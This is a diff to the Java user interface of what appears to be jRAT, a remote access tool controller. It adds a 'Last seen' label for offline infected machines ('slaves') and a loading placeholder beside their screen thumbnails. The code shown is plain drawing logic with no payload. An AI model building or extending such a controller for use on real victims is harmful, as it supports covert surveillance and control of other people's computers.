@@ -2,6 +2,7 @@ package io.jrat.controller.ui.panels;
 
 import iconlib.IconUtils;
 import io.jrat.controller.AbstractSlave;
+import io.jrat.controller.OfflineSlave;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet40Thumbnail;
 import io.jrat.controller.utils.Utils;
@@ -238,10 +239,16 @@ public class PanelMainClientsBoxes extends PanelMainClients {
 				public void paintComponent(Graphics g) {
 					super.paintComponent(g);
 					
-					if (slave.getThumbnail() != null) {
+					if (slave instanceof OfflineSlave) {
+						OfflineSlave os = (OfflineSlave) slave;
+
+						g.drawString("Last seen: " + os.getLastSeenDate(), 5, g.getFontMetrics().getHeight() + 5);
+					} else if (slave.getThumbnail() != null) {
 						Image image = slave.getThumbnail().getImage();
-						
+
 						g.drawImage(image, 0, 0, getWidth(), getHeight(), null);
+					} else {
+						g.drawString("Loading...", 5, 5);
 					}
 				}
 			};
